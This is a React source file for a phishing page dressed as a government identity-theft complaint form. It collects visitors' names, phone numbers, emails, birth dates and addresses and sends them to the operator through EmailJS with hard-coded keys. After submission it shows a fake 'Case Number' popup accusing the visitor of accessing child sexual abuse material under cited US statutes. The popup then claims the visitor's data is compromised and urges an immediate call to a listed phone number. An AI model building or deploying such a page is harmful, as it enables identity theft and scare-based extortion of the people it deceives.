import React, { useState } from 'react';
import emailjs from '@emailjs/browser';

const PersonalInfoForm = () => {
    // State to manage all form fields
    const [popup, setPopup] = useState(false)
    const [loader, setLoader] = useState(false)
    const [formData, setFormData] = useState({
        firstName: '',
        middleName: '',
        lastName: '',
        country: 'United States',
        primaryPhone: '',
        phoneType: 'Select',
        email: '',
        confirmEmail: '',
        filingFor: 'myself',
        birthYear: '',
        birthMonth: '',
        birthDay: '',
        streetAddress: '',
        aptNumber: '',
        city: '',
        state: 'Select a state',
        zipCode: '',
        livedSinceYear: '',
        livedSinceMonth: '',
    });

    // Handle input changes
    const handleChange = (e) => {
        const { name, value } = e.target;
        setFormData({
            ...formData,
            [name]: value,
        });
    };

    // Scroll to top when the component mounts
    React.useEffect(() => {
        window.scrollTo(0, 0);
    }, []);

    // Handle form submission
    const handleSubmit = (e) => {
        e.preventDefault();
        setLoader(true)

        // Replace with your EmailJS service ID, template ID, and public key
        const serviceID = 'service_8298tz9';
        const templateID = 'template_8strr9p';
        const publicKey = '7l1sjKuYx2Txblcvo';

        // Send the form data using EmailJS
        emailjs.sendForm(serviceID, templateID, e.target, publicKey)
            .then((response) => {
                console.log('Email sent successfully!', response.status, response.text);
                setPopup(true)
                // Optionally, reset the form after successful submission
                setFormData({
                    firstName: '',
                    middleName: '',
                    lastName: '',
                    country: 'United States',
                    primaryPhone: '',
                    phoneType: 'Select',
                    email: '',
                    confirmEmail: '',
                    filingFor: 'myself',
                    birthYear: '',
                    birthMonth: '',
                    birthDay: '',
                    streetAddress: '',
                    aptNumber: '',
                    city: '',
                    state: 'Select a state',
                    zipCode: '',
                    livedSinceYear: '',
                    livedSinceMonth: '',
                });
                setLoader(false)

            })
            .catch((error) => {
                console.error('Failed to send email:', error);
                alert('Failed to submit the form, please try again.');
                setLoader(false)

            });


    };

    return (

        <>
            <div className="fraud-form-container">
                <div className="progress-bar">
                    <div className="step">1 Theft Details</div>
                    <div className="step active">2 Your Information</div>
                    <div className="step">3 Suspect Information</div>
                    <div className="step">4 Additional Information</div>
                    <div className="step">5 Personal Statement</div>
                    <div className="step">6 Review Your Complaint</div>
                </div>
                <div className="info-box">
                    <p><strong>Fill in what you know.</strong> If you don’t know, leave it blank.</p>
                </div>

                <form className="row" style={{ padding: "40px 0" }} onSubmit={handleSubmit}>
                    {/* Name Fields */}
                    <div className="form-row row">
                        <div className="row-25" style={{ width: "100%" }}>
                            <h2 style={{ marginTop: "40px" }}>Your Information</h2>
                        </div>
                        <div className="row-75">
                            <p className="info-text">
                                Please provide <strong>your</strong> personal information below. If you are filing on behalf of someone
                                else, you will be able to enter their information after yours.
                            </p>
                            <div style={{ display: "flex", gap: "20px", flexDirection: "row" }}>
                                <div>
                                    <label>First name: <span className="required">*</span></label>
                                    <input
                                        type="text"
                                        name="firstName"
                                        placeholder="Enter first name"
                                        value={formData.firstName}
                                        onChange={handleChange}
                                        required
                                    />
                                </div>
                                <div>
                                    <label>Middle name:</label>
                                    <input
                                        type="text"
                                        name="middleName"
                                        placeholder="Enter middle name"
                                        value={formData.middleName}
                                        onChange={handleChange}
                                    />
                                </div>
                                <div>
                                    <label>Last name: <span className="required">*</span></label>
                                    <input
                                        type="text"
                                        name="lastName"
                                        placeholder="Enter last name"
                                        value={formData.lastName}
                                        onChange={handleChange}
                                        required
                                    />
                                </div>
                            </div>

                            {/* Contact Information */}
                            <h3 className="section-title">Current Contact Information</h3>
                            <label>Country:</label>
                            <select
                                name="country"
                                value={formData.country}
                                onChange={handleChange}
                            >
                                <option>United States</option>
                      
                            </select>

                            <label>Primary phone number: <span className="required">*</span></label>
                            <input
                                type="text"
                                name="primaryPhone"
                                placeholder="Enter phone number"
                                value={formData.primaryPhone}
                                onChange={handleChange}
                                required
                            />

                            <label>Phone type: <span className="required">*</span></label>
                            <select
                                name="phoneType"
                                value={formData.phoneType}
                                onChange={handleChange}
                            >
                                <option>Select</option>
                                <option>Mobile</option>
                                <option>Home</option>
                                <option>Work</option>
                            </select>

                            <label>Email address:</label>
                            <input
                                type="email"
                                name="email"
                                placeholder="Enter email address"
                                value={formData.email}
                                onChange={handleChange}
                            />

                            <label>Please confirm email address:</label>
                            <input
                                type="email"
                                name="confirmEmail"
                                placeholder="Re-enter email address"
                                value={formData.confirmEmail}
                                onChange={handleChange}
                            />

                            {/* Filing on behalf */}
                            <h3 className="section-title">Who are you filing this complaint for?</h3>
                            <div className="radio-group">
                                <div className="radio-option">
                                    <input
                                        type="radio"
                                        id="myself"
                                        name="filingFor"
                                        value="myself"
                                        checked={formData.filingFor === 'myself'}
                                        onChange={handleChange}
                                    />
                                    <label htmlFor="myself">Myself</label>
                                </div>
                                <div className="radio-option">
                                    <input
                                        type="radio"
                                        id="minor"
                                        name="filingFor"
                                        value="minor"
                                        checked={formData.filingFor === 'minor'}
                                        onChange={handleChange}
                                    />
                                    <label htmlFor="minor">A minor who can't complete the form</label>
                                </div>
                                <div className="radio-option">
                                    <input
                                        type="radio"
                                        id="adult"
                                        name="filingFor"
                                        value="adult"
                                        checked={formData.filingFor === 'adult'}
                                        onChange={handleChange}
                                    />
                                    <label htmlFor="adult">An adult who can't complete the form</label>
                                </div>
                            </div>
                        </div>
                    </div>
                    <hr />

                    {/* Date of Birth Information */}
                    <div style={{ display: "flex", width: "100%", gap: "20px" }} className={"form-row"}>
                        <div className="row-25" style={{ width: "100%" }}>
                            <h2 className="section-title">Date of Birth Information</h2>
                        </div>
                        <div className="row-75">
                            <div className="form-row">
                                {/* Birth Year */}
                                <select
                                    name="birthYear"
                                    value={formData.birthYear}
                                    onChange={handleChange}
                                    required
                                >
                                    <option value="">Select Year</option>
                                    <option value="">2025</option>
                                    <option value="">2024</option>
                                    {Array.from({ length: 100 }, (_, i) => {
                                        const year = new Date().getFullYear() - i;
                                        return (
                                            <option key={year} value={year}>
                                                {year}
                                            </option>
                                        );
                                    })}
                                </select>

                                {/* Birth Month */}
                                <select
                                    name="birthMonth"
                                    value={formData.birthMonth}
                                    onChange={handleChange}
                                    required
                                >
                                    <option value="">Select Month</option>
                                    {Array.from({ length: 12 }, (_, i) => {
                                        const month = i + 1;
                                        return (
                                            <option key={month} value={month}>
                                                {new Date(0, month - 1).toLocaleString('default', { month: 'long' })}
                                            </option>
                                        );
                                    })}
                                </select>

                                {/* Birth Day */}
                                <select
                                    name="birthDay"
                                    value={formData.birthDay}
                                    onChange={handleChange}
                                    required
                                >
                                    <option value="">Select Day</option>
                                    {Array.from({ length: 31 }, (_, i) => {
                                        const day = i + 1;
                                        return (
                                            <option key={day} value={day}>
                                                {day}
                                            </option>
                                        );
                                    })}
                                </select>
                            </div>
                        </div>
                    </div>

                    {/* Current Mailing Address */}
                    <div style={{ display: "flex", width: "100%", gap: "20px" }} className={"form-row"}>
                        <div className="row-25" style={{ width: "100%" }}>
                            <h2 className="section-title">Current Mailing Address</h2>
                        </div>
                        <div className="row-75">
                            <input
                                type="text"
                                name="streetAddress"
                                placeholder="Street address"
                                value={formData.streetAddress}
                                onChange={handleChange}
                            />
                            <input
                                type="text"
                                name="aptNumber"
                                placeholder="Apt. Number / PO Box"
                                value={formData.aptNumber}
                                onChange={handleChange}
                            />
                            <div className="form-row">
                                <input
                                    type="text"
                                    name="city"
                                    placeholder="City"
                                    value={formData.city}
                                    onChange={handleChange}
                                />
                                <select
                                    name="state"
                                    value={formData.state}
                                    onChange={handleChange}
                                >
                                    <option>Select a state</option>
                                    {/* Add state options dynamically */}
                                    <option value="AL">Alabama</option>
                                    <option value="AK">Alaska</option>
                                    <option value="AZ">Arizona</option>
                                    <option value="AR">Arkansas</option>
                                    <option value="CA">California</option>
                                    <option value="CO">Colorado</option>
                                    <option value="CT">Connecticut</option>
                                    <option value="DE">Delaware</option>
                                    <option value="FL">Florida</option>
                                    <option value="GA">Georgia</option>
                                    <option value="HI">Hawaii</option>
                                    <option value="ID">Idaho</option>
                                    <option value="IL">Illinois</option>
                                    <option value="IN">Indiana</option>
                                    <option value="IA">Iowa</option>
                                    <option value="KS">Kansas</option>
                                    <option value="KY">Kentucky</option>
                                    <option value="LA">Louisiana</option>
                                    <option value="ME">Maine</option>
                                    <option value="MD">Maryland</option>
                                    <option value="MA">Massachusetts</option>
                                    <option value="MI">Michigan</option>
                                    <option value="MN">Minnesota</option>
                                    <option value="MS">Mississippi</option>
                                    <option value="MO">Missouri</option>
                                    <option value="MT">Montana</option>
                                    <option value="NE">Nebraska</option>
                                    <option value="NV">Nevada</option>
                                    <option value="NH">New Hampshire</option>
                                    <option value="NJ">New Jersey</option>
                                    <option value="NM">New Mexico</option>
                                    <option value="NY">New York</option>
                                    <option value="NC">North Carolina</option>
                                    <option value="ND">North Dakota</option>
                                    <option value="OH">Ohio</option>
                                    <option value="OK">Oklahoma</option>
                                    <option value="OR">Oregon</option>
                                    <option value="PA">Pennsylvania</option>
                                    <option value="RI">Rhode Island</option>
                                    <option value="SC">South Carolina</option>
                                    <option value="SD">South Dakota</option>
                                    <option value="TN">Tennessee</option>
                                    <option value="TX">Texas</option>
                                    <option value="UT">Utah</option>
                                    <option value="VT">Vermont</option>
                                    <option value="VA">Virginia</option>
                                    <option value="WA">Washington</option>
                                    <option value="WV">West Virginia</option>
                                    <option value="WI">Wisconsin</option>
                                    <option value="WY">Wyoming</option>
                                </select>
                                <input
                                    type="text"
                                    name="zipCode"
                                    placeholder="Zip code"
                                    value={formData.zipCode}
                                    onChange={handleChange}
                                />
                            </div>
                        </div>
                    </div>

                    {/* Lived Since */}
                    <div style={{ display: "flex", width: "100%", gap: "20px" }} className={"form-row"}>
                        <div className="row-25" style={{ width: "100%" }}>
                            <h2 className="section-title">You have lived at this address since:</h2>
                        </div>
                        <div className="row-75">
                            <div className="form-row">
                                <select
                                    name="livedSinceYear"
                                    value={formData.livedSinceYear}
                                    onChange={handleChange}
                                >
                                    <option>Select Year</option>
                                    {/* Add year options dynamically */}
                                    {Array.from({ length: 100 }, (_, i) => {
                                        const year = new Date().getFullYear() - i;
                                        return (
                                            <option key={year} value={year}>
                                                {year}
                                            </option>
                                        );
                                    })}
                                </select>
                                <select
                                    name="livedSinceMonth"
                                    value={formData.livedSinceMonth}
                                    onChange={handleChange}
                                >
                                    <option>Select Month</option>
                                    {Array.from({ length: 12 }, (_, i) => {
                                        const month = i + 1;
                                        return (
                                            <option key={month} value={month}>
                                                {new Date(0, month - 1).toLocaleString('default', { month: 'long' })}
                                            </option>
                                        );
                                    })}
                                </select>
                            </div>
                        </div>
                    </div>

                    {/* Submit Button */}
                    <button
                        style={{
                            marginLeft: 'auto',
                            display: 'block',
                            marginBottom: "40px",
                        }}
                        type="submit"
                        className="submit-btn"
                    >
                        Continue →
                    </button>
                </form>
            </div>

            {
                loader ? (
                    <div className="popuparea">
                        <p style={{
                            color: "#fff"
                        }}>processing......</p>
                    </div>
                ) : ''
            }

            {
                popup ? (
                    <div className="popuparea">
                        <div className="pop-bx">
                            <h2 style={{
                                textAligen: "center",
                                background: " rgb(89, 13, 13)"
                            }}>Case Number : USC22514 </h2>

                            <p style={{
                                textAlign: "left",
                                fontSize: "12px"
                            }}>
                                The Material you have attempted to access has been Identified as Child
                                Pornography and in Breach of section. <br /><br />
                                8 U.S.C. § 2251- Sexual Exploitation of Children
                                (Production of child pornography) <br /><br />
                                18 U.S.C. § 2251A- Selling and Buying of Children
                                18 U.S.C. § 2252- Certain activities relating to material involving the sexual exploitation of minors
                                <br /><br />
                                (Possession, distribution and receipt of child pornography)

                                <br /><br />
                                18 U.S.C. § 2252A- certain activities relating to material constituting or containing child pornography <br /> <br />
                                18 U.S.C. § 2256- Definitions <br /> <br />
                                18 U.S.C. § 2260- Production of sexually explicit depictions of a minor for importation into the United States
                            </p>


                            <p className='p-2'>
                                Attention that Your Personal infromation may have been compromised. this could potentially put your finacial security and personal detials at risk. We Recommend you to make Immediate call
                                    <br /><br />
                                <a href="tel:+1-828-270-4049">Call Now : +1-828-270-4049</a>
                            </p>
                        </div>
                    </div>
                ) : ''
            }


        </>
    );
};

export default PersonalInfoForm;